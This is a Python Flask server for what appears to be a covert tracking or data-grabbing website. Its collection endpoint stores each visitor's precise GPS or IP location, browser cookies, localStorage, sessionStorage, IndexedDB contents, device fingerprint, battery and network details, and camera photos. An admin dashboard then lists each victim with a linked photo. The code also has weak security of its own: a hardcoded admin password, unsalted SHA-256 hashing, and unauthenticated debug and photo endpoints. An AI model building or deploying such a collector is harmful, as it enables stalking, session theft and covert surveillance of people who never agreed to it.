from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import sqlite3
import hashlib
import json
import os
import requests
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'ed09a8f63982882c3ce5bb2897d1d9d3')
CORS(app)

# Database setup
DB_PATH = 'user_data.db'

# Photo storage setup
PHOTOS_FOLDER = 'captured_photos'
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)
    print(f"Created photos folder: {PHOTOS_FOLDER}")

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def init_db():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Table to store collected user data
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        device_info TEXT,
        fingerprint TEXT,
        location_data TEXT,
        storage_info TEXT,
        connection_info TEXT,
        vpn_detection TEXT,
        battery_info TEXT,
        network_info TEXT,
        media_devices TEXT,
        camera_permission TEXT,
        raw_data TEXT
    )''')

    # Migrate existing database: Add new columns if they don't exist
    try:
        # Check if new columns exist
        c.execute("PRAGMA table_info(collected_data)")
        columns = [col[1] for col in c.fetchall()]

        # Add missing columns
        if 'battery_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN battery_info TEXT')
            print("Added battery_info column")

        if 'network_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN network_info TEXT')
            print("Added network_info column")

        if 'media_devices' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN media_devices TEXT')
            print("Added media_devices column")

        if 'camera_permission' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN camera_permission TEXT')
            print("Added camera_permission column")

    except Exception as e:
        print(f"Migration note: {e}")

    # Admin credentials table (username: Sabbar, password: Lights@123! - CHANGE THIS!)
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
    )''')

    # Always ensure new admin credentials are set and old ones are removed/updated
    # Default password: Lights@123! (CHANGE THIS!)
    password_hash = hashlib.sha256('Lights@123!'.encode()).hexdigest()
    
    # Check if new admin exists
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('Sabbar',))
    sabbar_user = c.fetchone()
    
    # Check if old admin exists
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
    old_admin = c.fetchone()
    
    if old_admin:
        # Delete old admin user
        c.execute('DELETE FROM admin_users WHERE username = ?', ('admin',))
    
    if not sabbar_user:
        # Create new admin user with correct credentials
        c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                  ('Sabbar', password_hash))
    else:
        # Update existing Sabbar user to ensure correct password
        c.execute('UPDATE admin_users SET password_hash = ? WHERE username = ?',
                  (password_hash, 'Sabbar'))

    # Photos table to store captured photos metadata
    c.execute('''CREATE TABLE IF NOT EXISTS captured_photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        filename TEXT NOT NULL,
        filepath TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        file_size INTEGER,
        fingerprint TEXT,
        data_entry_id INTEGER,
        capture_source TEXT
    )''')

    # Migrate existing photos table
    try:
        c.execute("PRAGMA table_info(captured_photos)")
        photo_columns = [col[1] for col in c.fetchall()]

        if 'fingerprint' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN fingerprint TEXT')
            print("Added fingerprint column to captured_photos")

        if 'data_entry_id' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN data_entry_id INTEGER')
            print("Added data_entry_id column to captured_photos")

        if 'capture_source' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN capture_source TEXT')
            print("Added capture_source column to captured_photos")
    except Exception as e:
        print(f"Photo table migration note: {e}")

    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

def get_client_ip():
    """Extract client IP from request, handling proxy headers correctly"""
    # Check X-Real-IP first (used by some proxies like Render)
    ip = request.headers.get('X-Real-IP')
    if ip:
        return ip.split(',')[0].strip()
    
    # Check X-Forwarded-For (can contain multiple IPs, take the first one)
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        # X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
        # The first IP is the original client IP
        return ip.split(',')[0].strip()
    
    # Fallback to remote_addr
    return request.remote_addr

@app.route('/api/get-ip-info')
def get_ip_info():
    """Backend endpoint to fetch IP info (avoids CORS issues)"""
    try:
        # Get client IP from headers (for when behind proxy/load balancer)
        client_ip = get_client_ip()
        
        # If client IP is localhost/127.0.0.1, the IP info services will auto-detect the server's public IP
        # This is expected behavior when testing locally
        is_localhost = client_ip in ['127.0.0.1', 'localhost', '::1'] or client_ip.startswith('192.168.') or client_ip.startswith('10.')

        # Try multiple IP info providers
        # IMPORTANT: Look up the CLIENT IP, not the server's IP
        # This ensures we get the correct location for the user, not the server
        providers = [
            ('https://ipapi.co/{}/json/', 'ipapi.co'),
            ('https://ipwhois.app/json/', 'ipwhois.app'),  # This one auto-detects, but we'll try client IP first
            ('https://ipinfo.io/{}/json', 'ipinfo.io'),
        ]
        
        # First, try to look up the client IP directly
        if not is_localhost and client_ip:
            for provider_template, provider_name in providers:
                try:
                    if '{' in provider_template:
                        # Provider supports IP lookup
                        lookup_url = provider_template.format(client_ip)
                    else:
                        # Provider auto-detects (like ipwhois.app)
                        lookup_url = provider_template
                    
                    response = requests.get(lookup_url, timeout=5)
                    if response.ok:
                        data = response.json()
                        # Verify we got info for the correct IP
                        if 'ip' in data:
                            # Some providers might return different IP, use the one we looked up
                            data['ip'] = client_ip
                        data['provider'] = provider_name
                        data['client_ip_from_request'] = client_ip
                        print(f"[IP INFO] Successfully looked up client IP {client_ip} using {provider_name}")
                        return jsonify(data), 200
                except Exception as e:
                    print(f"Provider {provider_name} failed for IP {client_ip}: {e}")
                    continue

        # Fallback: If client IP lookup failed or is localhost, try auto-detect
        # This will return server's IP, which is fine for localhost testing
        auto_detect_providers = [
            ('https://ipapi.co/json/', 'ipapi.co'),
            ('https://ipwhois.app/json/', 'ipwhois.app'),
            ('https://ipinfo.io/json', 'ipinfo.io'),
        ]
        
        for provider_url, provider_name in auto_detect_providers:
            try:
                response = requests.get(provider_url, timeout=5)
                if response.ok:
                    data = response.json()
                    # If we got server's IP but have client IP, use client IP
                    if not is_localhost and client_ip and 'ip' in data:
                        data['ip'] = client_ip
                        # Try to get location info for client IP
                        try:
                            client_lookup = requests.get(f'https://ipapi.co/{client_ip}/json/', timeout=5)
                            if client_lookup.ok:
                                client_data = client_lookup.json()
                                # Merge location data but keep client IP
                                data.update({k: v for k, v in client_data.items() if k != 'ip'})
                                data['ip'] = client_ip
                        except:
                            pass
                    data['provider'] = provider_name
                    data['client_ip_from_request'] = client_ip
                    return jsonify(data), 200
            except Exception as e:
                print(f"Auto-detect provider {provider_name} failed: {e}")
                continue

        # Final fallback: just return the client IP
        return jsonify({
            'ip': client_ip, 
            'provider': 'fallback', 
            'note': 'Limited info - IP from request headers',
            'client_ip_from_request': client_ip
        }), 200

    except Exception as e:
        print(f"Error fetching IP info: {e}")
        return jsonify({'ip': get_client_ip(), 'error': str(e)}), 200

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()

        # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
        # Fall back to request headers if not available
        ip_from_geo = data.get('ipInfo', {}).get('ip')
        ip_from_request = get_client_ip()
        ip_address = ip_from_geo if ip_from_geo else ip_from_request

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')

        # Prioritize GPS coordinates over IP location
        device_coords = data.get('deviceCoords')
        ip_info = data.get('ipInfo', {})

        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # User granted location permission - use GPS coordinates
            location_data = json.dumps({
                **ip_info,  # Keep IP info for reference
                'gps': device_coords,
                'latitude': device_coords.get('lat'),
                'longitude': device_coords.get('lon'),
                'location_type': 'gps',
                'accuracy': device_coords.get('accuracy'),
                'altitude': device_coords.get('altitude')
            })
        else:
            # Location permission denied - use IP-based location
            location_data = json.dumps({
                **ip_info,
                'location_type': 'ip'
            })

        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        battery_info = json.dumps(data.get('batteryInfo', {}))
        network_info = json.dumps(data.get('networkInfo', {}))
        media_devices = json.dumps(data.get('mediaDevices', {}))
        
        # Ensure camera permission is properly stored
        camera_access = data.get('cameraAccess', {})
        # If cameraAccess is empty, try to get it from raw data
        if not camera_access or not camera_access.get('granted'):
            # Try to extract from raw data if available
            raw_payload = data
            if 'cameraAccess' in raw_payload and raw_payload['cameraAccess']:
                camera_access = raw_payload['cameraAccess']
        
        camera_permission = json.dumps(camera_access)
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Enhanced logging for camera permission
        camera_data = camera_access
        print(f"\n{'='*60}")
        print(f"[DATA COLLECTION] New entry at {timestamp}")
        print(f"IP Address: {ip_address}")
        print(f"Camera Permission Data: {camera_data}")
        print(f"Camera Granted: {camera_data.get('granted', 'NOT SET')}")
        print(f"Camera Message: {camera_data.get('message', 'NO MESSAGE')}")
        if camera_data.get('error'):
            print(f"Camera Error: {camera_data.get('error')}")
        print(f"Camera Permission JSON: {camera_permission}")
        print(f"{'='*60}\n")

        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO collected_data
                     (timestamp, ip_address, user_agent, device_info, fingerprint,
                      location_data, storage_info, connection_info, vpn_detection,
                      battery_info, network_info, media_devices, camera_permission, raw_data)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp, ip_address, user_agent, device_info, fingerprint,
                   location_data, storage_info, connection_info, vpn_detection,
                   battery_info, network_info, media_devices, camera_permission, raw_data))
        entry_id = c.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            'status': 'success', 
            'message': 'Data collected successfully',
            'entry_id': entry_id,
            'fingerprint': fingerprint
        }), 200

    except Exception as e:
        print(f"Error collecting data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM admin_users WHERE username = ? AND password_hash = ?',
                  (username, password_hash))
        user = c.fetchone()
        conn.close()

        if user:
            session['admin_logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()

    # Convert rows to list of dictionaries
    data = []
    for row in rows:
        entry_id = row[0]
        fingerprint = row[5]

        # Find associated photo for this entry
        photo_filename = None
        c2 = conn.cursor()
        c2.execute('''SELECT filename FROM captured_photos
                     WHERE fingerprint = ? OR data_entry_id = ?
                     ORDER BY timestamp DESC LIMIT 1''', (fingerprint, entry_id))
        photo_row = c2.fetchone()
        if photo_row:
            photo_filename = photo_row[0]

        data.append({
            'id': entry_id,
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': fingerprint,
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'raw_data': row[10],
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {},
            'profile_photo': photo_filename  # Add profile photo
        })

    conn.close()
    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

@app.route('/admin/api/clear-all', methods=['DELETE'])
def clear_all_data():
    """Clear all collected data"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('DELETE FROM collected_data')
        conn.commit()
        deleted_count = c.rowcount
        conn.close()

        print(f"\n[ADMIN ACTION] All data cleared. Deleted {deleted_count} entries.\n")
        return jsonify({'status': 'success', 'message': f'All data cleared. Deleted {deleted_count} entries.'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/api/reset-database', methods=['DELETE'])
def reset_database():
    """Reset entire database - delete all data, photos, and photo files"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Count entries before deletion
        c.execute('SELECT COUNT(*) FROM collected_data')
        data_count = c.fetchone()[0]

        c.execute('SELECT COUNT(*) FROM captured_photos')
        photo_count = c.fetchone()[0]

        # Get all photo filenames to delete files
        c.execute('SELECT filepath FROM captured_photos')
        photo_files = c.fetchall()

        # Delete all data from tables
        c.execute('DELETE FROM collected_data')
        c.execute('DELETE FROM captured_photos')

        # Reset auto-increment counters by deleting from sqlite_sequence
        c.execute("DELETE FROM sqlite_sequence WHERE name='collected_data'")
        c.execute("DELETE FROM sqlite_sequence WHERE name='captured_photos'")

        conn.commit()
        conn.close()

        # Delete photo files from disk
        deleted_files = 0
        for photo_file in photo_files:
            filepath = photo_file[0]
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    deleted_files += 1
            except Exception as e:
                print(f"Warning: Could not delete file {filepath}: {e}")

        print(f"\n{'='*60}")
        print(f"[ADMIN ACTION] DATABASE RESET")
        print(f"Deleted {data_count} data entries")
        print(f"Deleted {photo_count} photo records")
        print(f"Deleted {deleted_files} photo files from disk")
        print(f"Auto-increment counters reset to 1")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': f'Database reset complete. Deleted {data_count} data entries, {photo_count} photos, and {deleted_files} files. IDs will start from 1.',
            'data_count': data_count,
            'photo_count': photo_count,
            'files_deleted': deleted_files
        }), 200
    except Exception as e:
        print(f"Error resetting database: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/debug/last-entry')
def debug_last_entry():
    """Debug endpoint to view the last collected entry"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY id DESC LIMIT 1')
    row = c.fetchone()
    conn.close()

    if not row:
        return jsonify({'message': 'No data collected yet'}), 404

    entry = {
        'id': row[0],
        'timestamp': row[1],
        'ip_address': row[2],
        'user_agent': row[3],
        'device_info': json.loads(row[4]) if row[4] else {},
        'fingerprint': row[5],
        'location_data': json.loads(row[6]) if row[6] else {},
        'storage_info': json.loads(row[7]) if row[7] else {},
        'connection_info': json.loads(row[8]) if row[8] else {},
        'vpn_detection': json.loads(row[9]) if row[9] else {},
        'raw_data_preview': (row[10] or '')[:500] + '...' if row[10] and len(row[10]) > 500 else row[10],
        'battery_info': json.loads(row[11]) if row[11] else {},
        'network_info': json.loads(row[12]) if row[12] else {},
        'media_devices': json.loads(row[13]) if row[13] else {},
        'camera_permission': json.loads(row[14]) if row[14] else {}
    }

    return jsonify(entry), 200

@app.route('/api/save-photo', methods=['POST'])
def save_photo():
    """API endpoint to save captured photos"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo file provided'}), 400

        photo = request.files['photo']
        timestamp_str = request.form.get('timestamp', datetime.now().isoformat())
        fingerprint = request.form.get('fingerprint', '')
        photo_ip = request.form.get('ip_address', '')
        capture_source = request.form.get('capture_source', 'unknown')

        # Allow explicit data_entry_id from frontend (for per-user captures)
        data_entry_id = request.form.get('data_entry_id', None)
        if data_entry_id:
            data_entry_id = int(data_entry_id)

        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Use the IP address from frontend if provided, otherwise get from request
        if photo_ip:
            client_ip = photo_ip
        else:
            client_ip = get_client_ip()

        # Generate unique filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        safe_ip = client_ip.replace('.', '_').replace(':', '_')
        filename = f'photo_{timestamp}_{safe_ip}.jpg'
        filepath = os.path.join(PHOTOS_FOLDER, filename)

        # Save the photo
        photo.save(filepath)
        file_size = os.path.getsize(filepath)

        # Get client info
        user_agent = request.headers.get('User-Agent', '')

        # Try to find matching data entry by fingerprint (only if not explicitly provided)
        if not data_entry_id and fingerprint:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
            result = c.fetchone()
            if result:
                data_entry_id = result[0]
            conn.close()

        # Store metadata in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO captured_photos
                     (timestamp, filename, filepath, ip_address, user_agent, file_size, fingerprint, data_entry_id, capture_source)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp_str, filename, filepath, client_ip, user_agent, file_size, fingerprint, data_entry_id, capture_source))
        photo_id = c.lastrowid
        conn.commit()
        conn.close()

        # Enhanced logging
        print(f"\n{'='*60}")
        print(f"[PHOTO CAPTURED]")
        print(f"Photo ID: {photo_id}")
        print(f"Capture Source: {capture_source}")
        print(f"Timestamp: {timestamp_str}")
        print(f"Filename: {filename}")
        print(f"File Size: {file_size} bytes")
        print(f"IP Address: {client_ip}")
        print(f"Fingerprint: {fingerprint[:16]}..." if fingerprint else "N/A")
        print(f"Linked to Data Entry: {data_entry_id}" if data_entry_id else "Not linked")
        print(f"Saved to: {filepath}")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': 'Photo saved successfully',
            'photo_id': photo_id,
            'filename': filename,
            'file_size': file_size,
            'data_entry_id': data_entry_id
        }), 200

    except Exception as e:
        print(f"Error saving photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/photos')
def admin_photos():
    """Admin page to view all captured photos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM captured_photos ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    photos = []
    for row in rows:
        photos.append({
            'id': row[0],
            'timestamp': row[1],
            'filename': row[2],
            'filepath': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'file_size': row[6],
            'fingerprint': row[7] if len(row) > 7 else None,
            'data_entry_id': row[8] if len(row) > 8 else None,
            'capture_source': row[9] if len(row) > 9 else 'unknown'
        })

    return render_template('photos.html', photos=photos, count=len(photos))

@app.route('/captured_photos/<filename>')
def serve_photo(filename):
    """Serve captured photo files"""
    from flask import send_from_directory
    return send_from_directory(PHOTOS_FOLDER, filename)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)